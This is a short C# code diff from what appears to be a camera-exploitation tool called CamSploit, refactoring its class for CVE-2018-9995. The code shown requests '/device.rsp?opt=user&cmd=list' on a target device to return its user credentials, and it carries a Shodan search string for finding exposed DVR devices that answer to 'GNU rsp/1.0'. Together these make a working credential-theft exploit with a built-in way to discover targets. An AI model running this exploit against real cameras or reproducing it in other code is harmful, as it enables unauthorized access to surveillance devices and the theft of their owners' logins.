@@ -5,9 +5,9 @@ using Newtonsoft.Json;
 
 namespace CamSploit.CVEs
 {
-	public class CVE_2018_9995 :IExploit
+	public class CVE_2018_9995 :Exploit
 	{
-        public Credencial Exploit(string url)
+        public override Credencial Run(string url)
 		{
 			var request = WebRequest.CreateHttp(url + "/device.rsp?opt=user&cmd=list");
 			request.Timeout = 10000;
@@ -37,10 +37,13 @@ namespace CamSploit.CVEs
 			}
 		}
 
-        public string ShodanSearchQuery { get { return "Server: GNU rsp/1.0"; } }
-		
-		public string Description { get { return "CVE-2018-9995 description"; } }
+		public override string ShodanSearchQuery
+		{
+			get { return "Server: GNU rsp/1.0"; }
+		}
 
-        public string CommonName { get { return "CVE-2018-9995"; } }
+		public override string Description { get { return "CVE-2018-9995 description"; } }
+
+        public override string CommonName { get { return "CVE-2018-9995"; } }
     }
 }
